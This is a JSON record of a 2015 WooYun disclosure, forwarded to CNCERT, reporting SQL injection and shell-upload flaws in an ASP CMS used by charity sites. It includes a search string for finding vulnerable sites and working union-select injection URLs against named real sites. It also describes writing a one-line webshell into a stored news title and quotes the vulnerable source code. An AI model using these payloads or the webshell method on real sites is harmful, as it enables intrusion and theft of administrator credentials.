{"id": 28744, "wybug_id": "wooyun-2015-0121438", "wybug_title": "某银行通用型sql注入/getshell/越权", "wybug_corp": "cncert", "wybug_author": "小龙", "wybug_date": "2015-06-19 13:51", "wybug_open_date": "2015-09-21 18:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "数字类型注射", "逻辑错误", "安全意识不足", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向公众公开  简要描述： 我是来刷WB的 详细说明：  \nhttp://wooyun.org/bugs/wooyun-2010-056967\n 可以看到直接拿到服务器了。危害不多说\n\n当然网站不止这么一点的，有些谷歌可能爬不到，下次C段，旁注找到此类网站直接秒，好可怕。。   漏洞证明：  \n厂商:爱心银行关键词：inurl:lovebank.asp 现在规模从2014年的96个使用此源码的网站扩展到6000+网站了，非常的快速是否可以getshell：是  （添加一句话，数据库是asa，并且新闻之类的东西都保存在数据库里面），添加新闻标题内容写一句话进去，然后直接连接数据库默认数据库：db\\#uxdb.asa  #换成23%即可sql注入表：Manage_User\n涉及部分网站：\nhttp://wlym.qufushi.com/gl/Manage_Main3edit.asp?ID=45%20xor%201=2%20union%20select%201,2,username,4,5,6,7%20from%20Manage_Userhttp://www.yzyglm.com/gl/Manage_Main3edit.asp?ID=45%20xor%201=2%20union%20select%201,2,username,4,5,6,7%20from%20Manage_Userhttp://www.ycyg.net/gl/Manage_Admin.asp 丁卯银行http://wlym.qufushi.com/gl/Manage_Admin.asp 曲阜市网http://szddyf.org/gl/Manage_Admin.asp   宿州市埇桥区道东街道办事处http://aixin.7wa.cc/gl/Manage_Admin.asp 奉节县永安公益服务中心http://yywgy.com/gl/Manage_Admin.asp  1元微公益爱心联合会http://www.anjigy.com/gl/Manage_Admin.asp 安吉公益网\n并且在：\ninc目录下Check_Sql.asp文件也出现了缺陷\n\nOn Error Resume Next'----- 对 get query 值 的过滤.if request.QueryString<>\"\" then\n\n'-----对 post 表 单值的过滤.if request.form<>\"\" then\n就这两个，所以cookie注入没过滤，可以cookie注入具体不操作了，自己去修复吧\ngl\\Manage_Main3edit.asp\n<%@ language=\"VBScript\"%><%response.Expires = 0%><!--#include file=\"conn.asp\"--><!--#include file=\"admin.asp\"-->  此处没有包含Check_Sql.asp这个文件，导致没有验证直接带入数据进数据库<%id=request(\"id\")set rs=server.createobject(\"adodb.recordset\")sqltext=\"select * from Manage_User where Id=\" & id （此句典型注入漏洞，ID参数没过滤严谨）rs.open sqltext,conn,1,1%>   修复方案：  1：过滤sql注入   版权声明：转载请注明来源 小龙@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-06-23 18:15 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给相应分中心，由其后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-19 14:13 |    \t\t噬魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:141 漏洞数:37        | 08安全团队)\t\t \n  你这么牛逼我怎么不知道    \n     2015-06-19 16:00 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  @噬魂 你是日农夫山泉的，呵呵    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}